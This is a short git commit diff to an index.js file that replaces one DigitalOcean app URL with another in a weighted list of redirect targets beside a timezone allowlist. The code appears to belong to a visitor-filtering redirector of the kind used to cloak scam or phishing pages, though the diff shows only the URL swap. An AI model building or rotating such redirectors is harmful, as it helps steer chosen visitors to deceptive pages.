0f8ab8181c4d22dc3a2afa950215725dfb3b0fb6
paalakash <palaksh452@gmail.com>
2026-07-03 08:58:41 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-2-mwn74.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://plankton-app-2-i2gue.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
 
 ];
 
